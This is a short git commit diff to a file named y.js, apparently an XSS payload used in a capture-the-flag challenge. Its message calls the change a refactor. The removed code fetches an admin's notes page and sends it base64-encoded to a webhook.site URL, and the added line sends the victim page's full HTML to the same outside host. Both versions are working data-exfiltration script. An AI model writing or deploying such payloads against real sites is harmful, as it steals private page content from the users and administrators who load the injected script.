abca6212b6afde452299fe2e3f39c3dde6245a0c
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-17 16:17:45 +0100

    Refactor fetch to send document HTML instead of notes

--- y.js
+++ y.js
@@ -1,5 +1,1 @@
-fetch('/notes?owner=admin')
-  .then(r => r.text())
-  .then(html => {
-    fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(html));
-  });
+fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(document.documentElement.innerHTML));
